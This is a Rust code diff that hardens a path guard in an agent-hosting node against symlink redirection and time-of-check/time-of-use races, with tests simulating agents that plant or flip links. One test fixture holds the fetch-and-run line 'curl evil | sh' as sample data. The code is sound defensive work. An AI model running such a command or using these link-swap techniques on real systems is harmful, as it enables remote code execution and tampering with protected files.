@@ -309,6 +309,12 @@ impl Place {
     }
 
     fn of(label: impl Into<String>, origin: Origin, path: PathBuf) -> Self {
+        // A relative place is relative to where the node runs, as the node
+        // itself would use it; an empty one stays empty and holds nothing.
+        let path = match path.is_absolute() || path.as_os_str().is_empty() {
+            true => path,
+            false => std::path::absolute(&path).unwrap_or(path),
+        };
         Self {
             label: label.into(),
             origin,
@@ -324,6 +330,19 @@ impl Place {
     /// was is still recognised.
     fn id(&self) -> Option<FileId> {
         std::fs::metadata(&self.lexical).ok().map(|m| file_id(&m))
+    }
+
+    /// `path` is this place or inside it by its spelling alone, as written
+    /// or as the place resolves, without asking the filesystem: what an
+    /// exception for the node's own areas is decided by, so a link an agent
+    /// made into one of them does not bring the agent's path along.
+    fn holds_lexically(&self, path: &Path) -> bool {
+        self.lexical.is_absolute()
+            && (path.starts_with(&self.lexical)
+                || self
+                    .canonical
+                    .as_deref()
+                    .is_some_and(|c| path.starts_with(c)))
     }
 
     /// `path` is this place or inside it. A place that is not an absolute
@@ -462,18 +481,23 @@ impl Layout {
         // In a pod, the state directory is on the claim every harness pod
         // mounts a part of. Which part is not the guard's to know, so all
         // of it counts.
+        let state_dir = absolute(state_dir);
         let state_volume =
-            std::env::var_os("KUBERNETES_SERVICE_HOST").and_then(|_| mount_root(&state_dir));
+            std::env::var_os("KUBERNETES_SERVICE_HOST").and_then(|_| claim(&state_dir, &homes));
         Self {
             state_volume,
-            data_dir: dirs::data_dir()
-                .map(|data| data.join("tracon"))
-                .unwrap_or_else(|| state_dir.join("data")),
+            data_dir: absolute(
+                dirs::data_dir()
+                    .map(|data| data.join("tracon"))
+                    .unwrap_or_else(|| state_dir.join("data")),
+            ),
             state_dir,
-            config_dir: config_path
-                .parent()
-                .map(Path::to_path_buf)
-                .unwrap_or(config_path),
+            config_dir: absolute(
+                config_path
+                    .parent()
+                    .map(Path::to_path_buf)
+                    .unwrap_or(config_path),
+            ),
             homes,
             path_var: std::env::var_os("PATH"),
             agent_roots,
@@ -483,14 +507,36 @@ impl Layout {
 }
 
 /// The top of the filesystem `path` is on: its highest ancestor on the same
-/// device.
+/// device. A path that does not exist yet (a first start) is judged by its
+/// nearest ancestor that does.
 fn mount_root(path: &Path) -> Option<PathBuf> {
-    let path = std::fs::canonicalize(path).ok()?;
+    let existing = path.ancestors().find(|at| at.exists())?;
+    let path = std::fs::canonicalize(existing).ok()?;
     let device = std::fs::metadata(&path).ok()?.dev();
     path.ancestors()
         .take_while(|at| std::fs::metadata(at).is_ok_and(|m| m.dev() == device))
         .last()
         .map(Path::to_path_buf)
+}
+
+/// `path` made absolute against the working directory, as the node itself
+/// would use a relative `TRACON_STATE_DIR`.
+fn absolute(path: PathBuf) -> PathBuf {
+    match path.is_absolute() {
+        true => path,
+        false => std::path::absolute(&path).unwrap_or(path),
+    }
+}
+
+/// The claim a pod's state directory is on: the top of its filesystem,
+/// never `/` and never a home directory, which would make everything an
+/// agent place and so nothing worth saying.
+fn claim(state_dir: &Path, homes: &[PathBuf]) -> Option<PathBuf> {
+    let root = mount_root(state_dir)?;
+    let is_home = homes
+        .iter()
+        .any(|home| *home == root || std::fs::canonicalize(home).is_ok_and(|home| home == root));
+    (root.parent().is_some() && !is_home).then_some(root)
 }
 
 /// The home directory the password database gives this process's user.
@@ -548,7 +594,11 @@ impl Guard {
             Origin::StateDir,
             layout.state_dir.clone(),
         )];
-        if let Some(volume) = &layout.state_volume {
+        // Only a pod's claim, by the file as well as the environment.
+        let pod = configs
+            .iter()
+            .any(|cfg| cfg.runtime.kind == super::RuntimeKind::Kubernetes);
+        if let Some(volume) = layout.state_volume.as_ref().filter(|_| pod) {
             agent_roots.push(Place::of(
                 "the state volume",
                 Origin::StateVolume,
@@ -931,11 +981,23 @@ impl Guard {
 
     /// A non-program key's value, by its kind.
     pub fn path(&self, key: &str, value: &str, stage: Stage) -> Result<(), Refusal> {
+        self.checked(key, value, stage).map(drop)
+    }
+
+    /// As `path`, with the path the node uses for the value (`~/`
+    /// expanded) and the identity of what it named when it was checked, so
+    /// a caller that opens it afterwards can tell whether it opened that.
+    fn checked(
+        &self,
+        key: &str,
+        value: &str,
+        stage: Stage,
+    ) -> Result<(PathBuf, Option<FileId>), Refusal> {
         if self.off {
-            return Ok(());
+            return Ok((PathBuf::from(value), None));
         }
         let Some(kind) = kind_of(key) else {
-            return Ok(());
+            return Ok((PathBuf::from(value), None));
         };
         let refused = |problem: Problem| Refusal {
             key: key.to_string(),
@@ -947,15 +1009,16 @@ impl Guard {
             true => self.expand_home(value).map_err(refused)?,
             false => PathBuf::from(value),
         };
-        match kind {
+        let walked = match kind {
             PathKind::SecretFile | PathKind::SecretDir => self.secret(&path, kind, stage),
             PathKind::WriteDir | PathKind::ManagedDir | PathKind::Root => {
                 self.directory(&path, kind)
             }
             PathKind::Mount => self.mount(&path),
-            PathKind::Executable | PathKind::ExecArgs => Ok(()),
+            PathKind::Executable | PathKind::ExecArgs => return Ok((path, None)),
         }
-        .map_err(refused)
+        .map_err(refused)?;
+        Ok((path, walked.id))
     }
 
     fn expand_home(&self, value: &str) -> Result<PathBuf, Problem> {
@@ -967,7 +1030,7 @@ impl Guard {
         }
     }
 
-    fn secret(&self, path: &Path, kind: PathKind, stage: Stage) -> Result<(), Problem> {
+    fn secret(&self, path: &Path, kind: PathKind, stage: Stage) -> Result<Walked, Problem> {
         plain_absolute(path)?;
         let walked = walk(path)?;
         self.not_a_node_secret(path, &walked)?;
@@ -976,8 +1039,10 @@ impl Guard {
         // the state volume (Kubernetes, `/state/config`): nothing an agent
         // sends is staged there, and a harness pod mounts only the claim's
         // top-level `tracon-*` volumes.
-        let in_config_secrets =
-            self.secret_dirs[0].holds(path) && self.secret_dirs[0].holds(&walked.resolved);
+        // Decided by spelling alone, written and resolved: a link an agent
+        // made into the secrets directory does not make its own path one.
+        let in_config_secrets = self.secret_dirs[0].holds_lexically(path)
+            && self.secret_dirs[0].holds_lexically(&walked.resolved);
         self.outside_agent_roots_but(path, &walked, in_config_secrets)?;
         outside(KERNEL, path, &walked, "a kernel interface")?;
         if let Some(store) = self
@@ -1016,13 +1081,14 @@ impl Guard {
                 _ => {}
             }
         }
-        self.chains(&walked, Writers::Foreign)
+        self.chains(&walked, Writers::Foreign)?;
+        Ok(walked)
     }
 
     /// `runtime.kubernetes.state_mount`: where the state volume is mounted.
     /// Not `/` or a system directory; it holds the state and configuration
     /// directories by design.
-    fn mount(&self, path: &Path) -> Result<(), Problem> {
+    fn mount(&self, path: &Path) -> Result<Walked, Problem> {
         plain_absolute(path)?;
         let walked = walk(path)?;
         if [path, walked.resolved.as_path()]
@@ -1032,10 +1098,10 @@ impl Guard {
             return Err(refuse("is the root directory"));
         }
         outside(SYSTEM_DIRS, path, &walked, "a system directory")?;
-        Ok(())
+        Ok(walked)
     }
 
-    fn directory(&self, path: &Path, kind: PathKind) -> Result<(), Problem> {
+    fn directory(&self, path: &Path, kind: PathKind) -> Result<Walked, Problem> {
         plain_absolute(path)?;
         let walked = walk(path)?;
         let resolved = &walked.resolved;
@@ -1055,20 +1121,24 @@ impl Guard {
         // The node's own areas are fixed by its layout, not by any key, and
         // on macOS they sit in the directory that is both configuration and
         // state.
+        // Decided by spelling alone, written and resolved alike: a path is
+        // in one of the node's own areas only if both say so, so a link an
+        // agent made into one does not bring the agent's own path along.
+        let own = |place: &Place| forms.iter().all(|p| place.holds_lexically(p));
         let own_area = match kind {
-            PathKind::WriteDir => forms.iter().any(|p| self.exports.holds(p)),
-            PathKind::ManagedDir => [&self.state, &self.data]
-                .iter()
-                .any(|place| forms.iter().any(|p| place.holds(p))),
+            PathKind::WriteDir => own(&self.exports),
+            PathKind::ManagedDir => own(&self.state) || own(&self.data),
             _ => false,
         };
         if !own_area && forms.iter().any(|p| self.config.holds(p)) {
             return Err(refuse(format!("is inside {}", self.config.shown())));
         }
         // An agent can write a marker, a bundle or a symbolic link into its
-        // own volume as easily as anywhere else it writes.
-        if !own_area && matches!(kind, PathKind::WriteDir | PathKind::ManagedDir) {
-            self.outside_agent_roots(path, &walked)?;
+        // own volume as easily as anywhere else it writes. The node's own
+        // areas may sit in the state directory or on the claim; nothing else
+        // in those may, and no link on the way may be an agent's.
+        if matches!(kind, PathKind::WriteDir | PathKind::ManagedDir) {
+            self.outside_agent_roots_but(path, &walked, own_area)?;
         }
         for place in [&self.config, &self.state] {
             if forms.iter().any(|p| place.within(p)) {
@@ -1094,13 +1164,11 @@ impl Guard {
         }
         self.chains(&walked, Writers::Foreign)?;
         match kind {
-            PathKind::WriteDir => self.export_allowed(path, &walked),
+            PathKind::WriteDir => self.export_allowed(path, &walked).map(|()| walked),
             PathKind::ManagedDir => {
-                let ours = [&self.state, &self.data]
-                    .iter()
-                    .any(|place| forms.iter().any(|p| place.holds(p)));
-                match ours || !walked.exists || crate::ui_bundle::recognised(resolved) {
-                    true => Ok(()),
+                let allowed = own_area || !walked.exists || crate::ui_bundle::recognised(resolved);
+                match allowed {
+                    true => Ok(walked),
                     false => Err(refuse(format!(
                         "is a directory that already exists, holds no UI bundle and is outside {} and {}; the node replaces this directory whole",
                         self.state.shown(),
@@ -1108,14 +1176,14 @@ impl Guard {
                     ))),
                 }
             }
-            _ => Ok(()),
+            _ => Ok(walked),
         }
     }
 
     /// The export directory: the node's own export area, or a directory
     /// that exists and holds the marker an operator put there by hand.
     fn export_allowed(&self, path: &Path, walked: &Walked) -> Result<(), Problem> {
-        if self.exports.holds(path) && self.exports.holds(&walked.resolved) {
+        if self.exports.holds_lexically(path) && self.exports.holds_lexically(&walked.resolved) {
             return Ok(());
         }
         if [path, walked.resolved.as_path()]
@@ -1194,6 +1262,17 @@ impl Guard {
         walked: &Walked,
         but_state: bool,
     ) -> Result<(), Problem> {
+        // A link kept in any place an agent can write is one an agent can
+        // repoint, whatever the path is for.
+        for root in &self.agent_roots {
+            if let Some(link) = walked.links.iter().find(|dir| root.holds(dir)) {
+                return Err(refuse(format!(
+                    "goes through a symbolic link in {}, inside {}, which an agent can write",
+                    link.display(),
+                    root.shown()
+                )));
+            }
+        }
         for root in self
             .agent_roots
             .iter()
@@ -1202,13 +1281,6 @@ impl Guard {
             if root.holds(path) || root.holds(&walked.resolved) {
                 return Err(refuse(format!(
                     "is inside {}, which an agent can write",
-                    root.shown()
-                )));
-            }
-            if let Some(link) = walked.links.iter().find(|dir| root.holds(dir)) {
-                return Err(refuse(format!(
-                    "goes through a symbolic link in {}, inside {}, which an agent can write",
-                    link.display(),
                     root.shown()
                 )));
             }
@@ -1370,6 +1442,9 @@ fn outside(dirs: &[&str], path: &Path, walked: &Walked, what: &str) -> Result<()
 #[derive(Debug)]
 struct Walked {
     resolved: PathBuf,
+    /// What `resolved` is on disk, from the walk's own `lstat`, when it
+    /// exists: what a file opened after the check must still be.
+    id: Option<FileId>,
     /// The longest part of `resolved` that exists: `resolved` itself when
     /// `exists`.
     existing: PathBuf,
@@ -1394,9 +1469,11 @@ fn walk(path: &Path) -> Result<Walked, Problem> {
     let mut resolved = PathBuf::from("/");
     let mut pending = parts(path);
     let mut links = Vec::new();
+    let mut id = None;
     while let Some(part) = pending.pop() {
         if part == ".." {
             resolved.pop();
+            id = None;
             continue;
         }
         let next = resolved.join(&part);
@@ -1417,6 +1494,7 @@ fn walk(path: &Path) -> Result<Walked, Problem> {
                 if !pending.is_empty() && !meta.is_dir() {
                     return Err(refuse(format!("{} is not a directory", next.display())));
                 }
+                id = Some(file_id(&meta));
                 resolved = next;
             }
             Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
@@ -1432,6 +1510,7 @@ fn walk(path: &Path) -> Result<Walked, Problem> {
                 }
                 return Ok(Walked {
                     resolved,
+                    id: None,
                     existing,
                     links,
                     exists: false,
@@ -1440,9 +1519,15 @@ fn walk(path: &Path) -> Result<Walked, Problem> {
             Err(e) => return Err(refuse(format!("{}: {e}", next.display()))),
         }
     }
+    let id = id.or_else(|| {
+        std::fs::symlink_metadata(&resolved)
+            .ok()
+            .map(|m| file_id(&m))
+    });
     Ok(Walked {
         existing: resolved.clone(),
         resolved,
+        id,
         links,
         exists: true,
     })
@@ -1643,25 +1728,118 @@ pub fn path(key: &str, value: &Path) -> std::io::Result<()> {
 
 /// A secret key's file, read after it is checked, and read from the file
 /// that was checked: it is opened first, and its identity compared with
-/// what the path names once the check has passed, so a swap in between is
-/// refused rather than read.
+/// what the check's own walk found, so a swap in between is refused rather
+/// than read.
 pub fn read_secret(key: &str, value: &Path) -> std::io::Result<String> {
     let mut file = std::fs::File::open(value)?;
     let opened = file_id(&file.metadata()?);
-    path(key, value)?;
-    let named = file_id(&std::fs::metadata(value)?);
-    if named != opened {
-        return Err(std::io::Error::new(
-            std::io::ErrorKind::PermissionDenied,
-            format!(
-                "refused by the path guard: {key}: {} changed while it was being read",
-                value.display()
-            ),
-        ));
+    if let Some(guard) = current() {
+        let (_, checked) = guard.checked(key, &value.to_string_lossy(), Stage::Use)?;
+        same(key, value, opened, checked)?;
     }
     let mut text = String::new();
     file.read_to_string(&mut text)?;
     Ok(text)
+}
+
+/// A file inside a secret directory key's directory (`config.json` in
+/// `docker_config`), read as `read_secret` reads one: the directory is
+/// checked, and the file is held to the rules for a secret file under that
+/// key and compared by identity with what was opened. `None` when there is
+/// no such file.
+pub fn read_secret_in(key: &str, dir: &Path, name: &str) -> std::io::Result<Option<String>> {
+    let path = dir.join(name);
+    let mut file = match std::fs::File::open(&path) {
+        Ok(file) => file,
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
+        Err(e) => return Err(e),
+    };
+    let opened = file_id(&file.metadata()?);
+    if let Some(guard) = current() {
+        guard.checked(key, &dir.to_string_lossy(), Stage::Use)?;
+        if !guard.off {
+            let walked = guard
+                .secret(&path, PathKind::SecretFile, Stage::Use)
+                .map_err(|problem| Refusal {
+                    key: key.to_string(),
+                    value: path.to_string_lossy().into_owned(),
+                    reason: problem.reason,
+                    missing: problem.missing,
+                })?;
+            same(key, &path, opened, walked.id)?;
+        }
+    }
+    let mut text = String::new();
+    file.read_to_string(&mut text)?;
+    Ok(Some(text))
+}
+
+fn same(key: &str, path: &Path, opened: FileId, checked: Option<FileId>) -> std::io::Result<()> {
+    match checked == Some(opened) {
+        true => Ok(()),
+        false => Err(std::io::Error::new(
+            std::io::ErrorKind::PermissionDenied,
+            format!(
+                "refused by the path guard: {key}: {} changed while it was being opened",
+                path.display()
+            ),
+        )),
+    }
+}
+
+/// A directory key's directory, opened after it is checked and held open:
+/// the descriptor is compared by identity with what the check's own walk
+/// found, so a link repointed between the two is refused, and a caller
+/// that then works only through the descriptor (`openat`, `renameat`) is
+/// writing into what was checked. `create` makes the directory first.
+pub fn open_dir(key: &str, value: &Path, create: bool) -> std::io::Result<std::os::fd::OwnedFd> {
+    match current() {
+        Some(guard) => guard.open_dir(key, value, create),
+        None => {
+            let path = match EXPANDS_HOME.contains(&key) {
+                true => super::expand_home(value),
+                false => value.to_path_buf(),
+            };
+            if create {
+                std::fs::create_dir_all(&path)?;
+            }
+            open_dir_nofollow(&path)
+        }
+    }
+}
+
+impl Guard {
+    /// `open_dir` against this guard.
+    pub fn open_dir(
+        &self,
+        key: &str,
+        value: &Path,
+        create: bool,
+    ) -> std::io::Result<std::os::fd::OwnedFd> {
+        let shown = value.to_string_lossy();
+        let (path, _) = self.checked(key, &shown, Stage::Use)?;
+        if create {
+            std::fs::create_dir_all(&path)?;
+        }
+        let dir = open_dir_nofollow(&path)?;
+        let stat = rustix::fs::fstat(&dir)?;
+        let opened = (stat.st_dev as u64, stat.st_ino as u64);
+        if !self.off {
+            let (_, checked) = self.checked(key, &shown, Stage::Use)?;
+            same(key, &path, opened, checked)?;
+        }
+        Ok(dir)
+    }
+}
+
+/// A directory opened as itself: not through a link at its own name.
+pub fn open_dir_nofollow(path: &Path) -> std::io::Result<std::os::fd::OwnedFd> {
+    use rustix::fs::{Mode, OFlags};
+    Ok(rustix::fs::open(
+        path,
+        OFlags::RDONLY | OFlags::DIRECTORY | OFlags::NOFOLLOW | OFlags::CLOEXEC,
+        Mode::empty(),
+    )?)
 }
 
 /// Warn about every key in the file `serve` loaded that an edit could not
@@ -2598,6 +2776,7 @@ mod tests {
     fn two_edits_cannot_move_the_state_volume_and_then_use_it() {
         let node = Node::new();
         let mut running_cfg = node.config();
+        running_cfg.runtime.kind = super::super::RuntimeKind::Kubernetes;
         running_cfg.runtime.kubernetes.state_mount = node.at("pvc");
         node.file(
             "pvc/tracon-workspace-x/pyproject.toml",
@@ -2635,6 +2814,7 @@ mod tests {
     fn a_pods_secrets_directory_on_the_claim_is_allowed() {
         let node = Node::new();
         let mut cfg = node.config();
+        cfg.runtime.kind = super::super::RuntimeKind::Kubernetes;
         cfg.runtime.kubernetes.state_mount = node.at("pvc");
         let guard = node.guard_with(pod(&node), &cfg);
         let key = node.file("pvc/config/tracon/secrets/embed.key", "sk");
@@ -2674,6 +2854,164 @@ mod tests {
                 .path("docs.export_dir", &shown(&exports), Stage::Use)
                 .unwrap();
         }
+    }
+
+    /// The final re-review's probe: an export directory spelled inside an
+    /// agent's volume, reaching the export area (or a marked directory)
+    /// through a link the agent made, is refused; so is a bundle directory
+    /// reaching the state directory that way.
+    #[test]
+    fn a_link_an_agent_made_into_an_own_area_does_not_bring_its_path_along() {
+        let node = Node::new();
+        let mut layout = node.layout();
+        layout
+            .agent_roots
+            .push(("Podman's container storage".into(), node.at("containers")));
+        let guard = node.guard_with(layout, &node.config());
+        let volume = node.dir("containers/volumes/tracon-workspace-x/_data");
+        node.dir("data/exports/sub");
+        std::os::unix::fs::symlink(node.at("data/exports"), volume.join("l")).unwrap();
+        let notes = node.dir("home/notes");
+        node.file("home/notes/.tracon-export", "");
+        std::os::unix::fs::symlink(&notes, volume.join("m")).unwrap();
+        std::os::unix::fs::symlink(node.at("state"), volume.join("s")).unwrap();
+        for (key, value) in [
+            ("docs.export_dir", volume.join("l/sub")),
+            ("docs.export_dir", volume.join("l")),
+            ("docs.export_dir", volume.join("m")),
+            ("ui.opencode_bundle_dir", volume.join("s/opencode-ui")),
+        ] {
+            for stage in [Stage::Edit, Stage::Use] {
+                let refusal = guard.path(key, &shown(&value), stage).unwrap_err();
+                assert!(
+                    refusal.reason.contains("which an agent can write"),
+                    "{key} {value:?}: {refusal}"
+                );
+            }
+        }
+    }
+
+    /// The same, on a pod's claim: a secret spelled in a workspace and
+    /// linked into the configuration's secrets is the workspace's.
+    #[test]
+    fn a_link_from_a_workspace_into_the_secrets_directory_is_refused() {
+        let node = Node::new();
+        let mut cfg = node.config();
+        cfg.runtime.kind = super::super::RuntimeKind::Kubernetes;
+        cfg.runtime.kubernetes.state_mount = node.at("pvc");
+        let guard = node.guard_with(pod(&node), &cfg);
+        let secrets = node.at("pvc/config/tracon/secrets");
+        node.file("pvc/config/tracon/secrets/embed.key", "real");
+        let workspace = node.dir("pvc/tracon-workspace-x");
+        std::os::unix::fs::symlink(&secrets, workspace.join("l")).unwrap();
+        for (key, value) in [
+            ("embed.api_key_file", workspace.join("l/embed.key")),
+            ("runtime.kubernetes.builder.tls_dir", workspace.join("l")),
+            (
+                "runtime.kubernetes.builder.docker_config",
+                workspace.join("l"),
+            ),
+        ] {
+            for stage in [Stage::Edit, Stage::Use] {
+                let refusal = guard.path(key, &shown(&value), stage).unwrap_err();
+                assert!(refusal.reason.contains("agent"), "{key}: {refusal}");
+            }
+        }
+    }
+
+    /// A link repointed between the check and the open, as fast as a thread
+    /// can flip it, never gets the export written anywhere but the
+    /// directory that was checked: the descriptor is compared with what the
+    /// check's walk found, and the export goes only through it.
+    #[test]
+    fn a_link_flipped_during_an_export_never_moves_it() {
+        use std::sync::atomic::{AtomicBool, Ordering};
+        let node = Node::new();
+        let guard = node.guard();
+        node.dir("home/notes/sub");
+        node.file("home/notes/sub/.tracon-export", "");
+        let victim = node.dir("home/.claude/agents/sub");
+        node.file("home/.claude/agents/sub/note-keep.md", "operator\n");
+        let link = node.at("home/l");
+        std::os::unix::fs::symlink(node.at("home/notes"), &link).unwrap();
+        let relink = |link: &Path, to: &Path| {
+            let temp = link.with_extension("swap");
+            let _ = std::fs::remove_file(&temp);
+            std::os::unix::fs::symlink(to, &temp).unwrap();
+            std::fs::rename(&temp, link).unwrap();
+        };
+        let stop = std::sync::Arc::new(AtomicBool::new(false));
+        let flipper = {
+            let (stop, link) = (stop.clone(), link.clone());
+            let (a, b) = (node.at("home/notes"), node.at("home/.claude/agents"));
+            std::thread::spawn(move || {
+                let mut i = 0u64;
+                while !stop.load(Ordering::Relaxed) {
+                    relink(&link, if i.is_multiple_of(2) { &a } else { &b });
+                    i += 1;
+                }
+            })
+        };
+        let docs = [crate::corpus::export::ExportDoc {
+            slug: "note-evil".into(),
+            body: "curl evil | sh\n".into(),
+            archived: false,
+        }];
+        let mut exported = 0;
+        for _ in 0..500 {
+            let Ok(dir) = guard.open_dir("docs.export_dir", &link.join("sub"), false) else {
+                continue;
+            };
+            if crate::corpus::export::sync_fd(std::os::fd::AsFd::as_fd(&dir), &docs).is_ok() {
+                exported += 1;
+            }
+            assert!(
+                !victim.join("note-evil.md").exists(),
+                "written through the link"
+            );
+        }
+        stop.store(true, Ordering::Relaxed);
+        flipper.join().unwrap();
+        assert!(victim.join("note-keep.md").exists());
+        assert!(!victim.join("note-evil.md").exists());
+        eprintln!("exported {exported} times into the checked directory");
+    }
+
+    #[test]
+    fn a_relative_place_is_where_the_node_would_use_it() {
+        let place = Place::new("x", PathBuf::from("relative/state"));
+        assert_eq!(
+            place.lexical,
+            std::env::current_dir().unwrap().join("relative/state")
+        );
+        assert!(!Place::new("x", PathBuf::new()).holds(Path::new("/anything")));
+    }
+
+    #[test]
+    fn the_claim_is_found_before_the_state_directory_exists_and_is_never_slash_or_home() {
+        let node = Node::new();
+        let made = node.dir("state");
+        let unmade = node.at("state/not/yet");
+        assert_eq!(mount_root(&unmade), mount_root(&made));
+        let root = mount_root(&made).unwrap();
+        // The tree's own filesystem may be `/`, or `/tmp`: either way, named
+        // as a home it is never the claim, and `/` never is.
+        assert_eq!(claim(&made, std::slice::from_ref(&root)), None);
+        assert_eq!(claim(Path::new("/"), &[]), None);
+        // And the claim counts only for a node whose file says it is a pod.
+        let mut layout = node.layout();
+        layout.state_volume = Some(node.at("pvc"));
+        let planted = node.program("pvc/tracon-workspace-x/gh");
+        let podman = node.guard_with(layout.clone(), &node.config());
+        let refusal = podman.program("publish.gh", &shown(&planted)).unwrap_err();
+        assert!(!refusal.reason.contains("state volume"), "{refusal}");
+        let mut pod_cfg = node.config();
+        pod_cfg.runtime.kind = super::super::RuntimeKind::Kubernetes;
+        let pod_guard = node.guard_with(layout, &pod_cfg);
+        let refusal = pod_guard
+            .program("publish.gh", &shown(&planted))
+            .unwrap_err();
+        assert!(refusal.reason.contains("state volume"), "{refusal}");
     }
 
     #[test]
